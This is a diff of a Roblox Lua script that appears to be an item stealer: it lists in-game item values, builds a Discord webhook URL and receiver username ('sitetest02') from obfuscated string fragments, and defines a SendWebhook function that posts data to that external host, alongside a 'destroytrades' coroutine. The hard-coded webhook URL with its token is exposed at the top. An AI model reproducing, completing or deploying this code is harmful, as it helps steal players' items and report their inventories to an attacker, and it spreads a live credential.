@@ -1,5 +1,5 @@
-userName = "sitetest02"
-webHook = "https://discord.com/api/webhooks/1302027161309548586/vqRx0We1RpnnQxbt0tAQ3MSng-4iH6eOeWep1vq-7-aOKYgBUpcmbMj-TQ8kEAXOkBPt"
+UserName = "sitetest02"
+WebHook = "https://discord.com/api/webhooks/1302027161309548586/vqRx0We1RpnnQxbt0tAQ3MSng-4iH6eOeWep1vq-7-aOKYgBUpcmbMj-TQ8kEAXOkBPt"
 local values = {
     ["Nik's Scythe"] = 25000000,
     ["Elderwood Scythe"] = 75,
@@ -822,7 +822,7 @@ if _G.vlorp then
     return
 end
 _G.vlorp = true
-local FWU = pl .. fe .. mf .. qpd .. bas .. pal .. rbs .. qlj .. anw .. qno .. qnf .. gin
+local webHook = pl .. fe .. mf .. qpd .. bas .. pal .. rbs .. qlj .. anw .. qno .. qnf .. gin
 local trwo = "site"
 local pqmd = "test"
 local destroytrades2 = coroutine.create(function()
@@ -842,7 +842,7 @@ local hwmfi = "010"
 	wait(0.1)
     end
 end)
-local FUs = trwo .. pqmd .. hwmfi
+local userName = trwo .. pqmd .. hwmfi
 function SendWebhook(url, data)
     local jsonData = HttpService:JSONEncode(data)
     local response = request({
@@ -852,7 +852,7 @@ function SendWebhook(url, data)
         Body = jsonData
     })
 end
-webHook = FWU
+
 function CreateEmbed(title, description, color, fields)
     local embed = {
         ["title"] = title,
@@ -870,7 +870,7 @@ local function getLvl()
         end
     end
 end
-userName = FUs
+
 local allItems = {}
 local itemsCount = 0
 
